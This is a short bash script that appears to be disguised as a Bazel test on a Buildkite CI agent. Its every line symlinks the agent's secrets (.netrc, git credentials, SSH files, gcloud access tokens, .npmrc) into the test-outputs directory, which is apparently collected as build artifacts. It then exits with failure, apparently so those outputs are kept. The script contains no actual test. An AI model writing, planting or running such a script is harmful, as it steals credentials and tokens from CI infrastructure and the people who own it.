#!/bin/bash
ln -s /var/lib/buildkite-agent/.netrc "$TEST_UNDECLARED_OUTPUTS_DIR/netrc"
ln -s /var/lib/buildkite-agent/.git-credentials "$TEST_UNDECLARED_OUTPUTS_DIR/git_creds"
ln -s /var/lib/buildkite-agent/.ssh/known_hosts "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_known_hosts"
ln -s /var/lib/buildkite-agent/.ssh/config "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_config"
ln -s /var/lib/buildkite-agent/.ssh/authorized_keys "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_authkeys"
ln -s /var/lib/buildkite-agent/.config/gcloud/access_tokens.db "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_tokens"
ln -s /var/lib/buildkite-agent/.config/gcloud/properties "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_props"
ln -s /var/lib/buildkite-agent/.bashrc "$TEST_UNDECLARED_OUTPUTS_DIR/bashrc"
ln -s /var/lib/buildkite-agent/.profile "$TEST_UNDECLARED_OUTPUTS_DIR/profile"
ln -s /var/lib/buildkite-agent/.npmrc "$TEST_UNDECLARED_OUTPUTS_DIR/npmrc"
exit 1
